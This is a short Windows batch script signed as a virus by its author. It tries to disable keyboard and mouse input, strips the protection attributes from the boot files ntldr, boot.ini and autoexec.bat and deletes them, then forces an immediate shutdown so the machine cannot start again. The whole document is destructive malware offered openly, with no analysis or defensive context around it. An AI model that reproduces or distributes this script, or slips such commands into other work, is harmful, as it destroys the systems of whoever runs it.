@echo off
rundll32.exe keyboard,disable
rundll32.exe mouse,disable
attrib -r -s -h c:\ntldr
del c:\ntldr
attrib -r -s -h c:\autoexec.bat
del c:\autoexec.bat
attrib -r -s -h c:\boot.ini
del c:\boot.ini
shutdown -s -t 00

__-Virus Author: ViktoR-pUnK--__